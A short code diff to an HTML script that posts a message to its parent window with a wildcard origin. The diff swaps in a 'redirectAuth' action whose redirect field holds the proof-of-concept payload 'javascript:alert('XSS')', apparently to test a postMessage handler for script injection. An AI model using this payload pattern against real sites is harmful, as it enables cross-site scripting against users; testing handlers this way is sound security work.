@@ -1,6 +1,8 @@
 <script>
 parent.postMessage({
-    action: "requestRedirectionTo",
-    targetUrlStr: "a:a"
+    action: "redirectAuth",
+    type: "MAPI",
+    r: "javascript:alert('XSS')",
+    n: "12345"
 }, "*");
 </script>
